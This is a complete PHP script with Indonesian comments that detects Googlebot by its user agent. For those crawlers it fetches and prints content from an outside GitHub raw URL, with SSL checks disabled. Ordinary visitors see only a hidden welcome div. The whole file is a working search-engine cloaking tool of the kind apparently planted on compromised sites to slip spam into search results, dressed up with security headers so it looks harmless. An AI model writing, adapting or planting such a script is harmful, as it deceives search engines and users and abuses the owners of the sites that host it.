<?php
// Fungsi untuk mendeteksi apakah pengunjung adalah bot
function is_bot() {
    if (!isset($_SERVER["HTTP_USER_AGENT"])) {
        return false;
    }

    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $bots = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    
    // Loop untuk memeriksa apakah user-agent mengandung nama bot
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// Fungsi untuk mengambil konten dari URL eksternal
function fetch_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Mengikuti redirect
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Matikan verifikasi SSL (hanya untuk pengujian atau sumber yang terpercaya)
    $content = curl_exec($ch);

    // Cek error jika gagal mengambil konten
    if (curl_errno($ch)) {
        $content = "Error fetching content: " . curl_error($ch);
    }
    curl_close($ch);
    
    return $content;
}

// Fungsi utama untuk menangani permintaan
function handle_request() {
    if (is_bot()) {
        // URL untuk bot yang mengarah ke konten yang ingin ditampilkan
        $url = "https://raw.githubusercontent.com/camerun69/joy/refs/heads/main/eduau";
        
        // Ambil konten dari URL eksternal
        $content = fetch_content($url);
        
        // Tampilkan konten atau pesan error jika gagal
        return ($content !== false) ? $content : "Konten tidak tersedia.";
    }
    
    // Jika pengunjung bukan bot, tampilkan pesan biasa atau landing page yang disembunyikan
    return '<div style="display:none;">Selamat datang di website kami!</div>';
}

// Mengirimkan header keamanan dasar untuk meningkatkan perlindungan
header('X-Frame-Options: DENY');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');

// Tampilkan konten berdasarkan hasil fungsi handle_request
echo handle_request();
?>
